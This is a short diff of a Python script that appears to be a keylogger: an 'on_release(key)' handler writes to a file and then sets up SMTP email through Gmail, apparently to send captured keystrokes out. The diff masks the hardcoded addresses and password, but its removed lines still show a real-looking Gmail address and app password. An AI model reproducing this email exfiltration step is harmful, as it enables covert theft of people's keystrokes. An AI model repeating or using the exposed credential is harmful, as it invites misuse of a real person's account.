@@ -21,9 +21,9 @@ def on_release(key):
         file.close()
         smtp_port=587
         smtp_server="smtp.gmail.com"
-        email_from="sawantvarad0@gmail.com"
-        email_to="sawantvarad0@gmail.com"
-        password="nwvhiigzqrawezwg"
+        email_from="**********************"
+        email_to="**********************"
+        password="**********************"
         msg=MIMEMultipart()
         msg['From']=email_from
         msg['To']=email_to
